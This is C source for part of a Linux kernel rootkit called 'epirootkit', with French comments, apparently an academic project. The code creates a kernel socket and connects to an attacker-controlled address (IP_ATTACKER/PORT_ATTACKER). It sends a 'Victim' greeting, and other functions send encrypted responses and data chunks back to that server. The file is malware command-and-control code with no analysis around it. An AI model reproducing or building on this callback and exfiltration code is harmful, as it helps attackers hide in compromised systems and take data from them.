#include "rootkit.h"

// Fonction pour se connecter au serveur
int connect_server(void) {
    struct sockaddr_in addr;
    int ret;
    struct msghdr msg = {0};
    struct kvec vec;

    printk(KERN_ALERT "[ROOTKIT] Creating socket...\n");
    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_socket);
    if (ret < 0) {
        printk(KERN_ERR "[ROOTKIT] Socket creation failed: %d\n", ret);
        return ret;
    }
    printk(KERN_ALERT "[ROOTKIT] Socket created\n");

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT_ATTACKER);
    
    printk(KERN_ALERT "[ROOTKIT] Converting IP %s...\n", IP_ATTACKER);
    ret = in4_pton(IP_ATTACKER, -1, (u8*)&addr.sin_addr.s_addr, -1, NULL);
    if (ret != 1) {
        printk(KERN_ERR "[ROOTKIT] Invalid IP format\n");
        sock_release(conn_socket);
        return -EINVAL;
    }
    printk(KERN_ALERT "[ROOTKIT] IP converted successfully\n");

    printk(KERN_ALERT "[ROOTKIT] Connecting to %s:%d...\n", IP_ATTACKER, PORT_ATTACKER);
    ret = kernel_connect(conn_socket, (struct sockaddr *)&addr, sizeof(addr), 0);
    if (ret < 0) {
        printk(KERN_ERR "[ROOTKIT] Connection failed: %d\n", ret);
        sock_release(conn_socket);
        return ret;
    }
    printk(KERN_ALERT "[ROOTKIT] Connected successfully!\n");

    vec.iov_base = "[Victim] Hello epirootkit !\n";
    vec.iov_len = strlen("[Victim] Hello epirootkit !\n");
    
    ret = kernel_sendmsg(conn_socket, &msg, &vec, 1, vec.iov_len);
    printk(KERN_ALERT "[ROOTKIT] Hello message sent: %d bytes\n", ret);

    return 0;
}

// Fonction qui envoie une reponse string au serveur (chiffrée)
void send_response(const char *msg) {
    send_encrypted_response(msg);
}

// Fonction qui envoie une reponse de la taille d'un buffer au serveur (chiffrée)
void send_chunk_response(const char *data, size_t len) {
    send_encrypted_chunk_response(data, len);
}